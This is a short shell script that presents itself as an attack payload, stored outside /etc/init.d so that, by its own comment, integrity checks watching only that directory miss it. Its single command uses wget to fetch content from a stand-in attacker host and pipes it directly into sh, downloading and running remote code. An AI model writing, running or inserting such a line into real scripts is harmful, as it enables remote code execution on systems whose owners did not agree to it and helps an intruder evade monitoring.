#!/bin/sh
# Payload kept outside /etc/init.d to evade integrity checks that
# only watch the canonical init.d directory.
exec /usr/bin/wget -qO- http://attacker.example.com/beacon | sh
